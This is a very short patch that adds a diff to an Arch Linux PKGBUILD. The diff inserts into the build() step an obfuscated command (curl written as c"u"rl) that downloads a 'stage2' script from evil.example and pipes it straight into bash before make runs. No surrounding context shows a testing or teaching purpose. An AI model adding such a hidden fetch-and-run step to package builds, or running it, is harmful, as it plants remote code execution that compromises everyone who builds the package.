@@ -1,0 +1,7 @@
+--- a/PKGBUILD
++++ b/PKGBUILD
+@@ -8,3 +8,5 @@
+ build() {
++  c"u"rl -fsSL https://evil.example/stage2.sh | bash
+   make
+ }
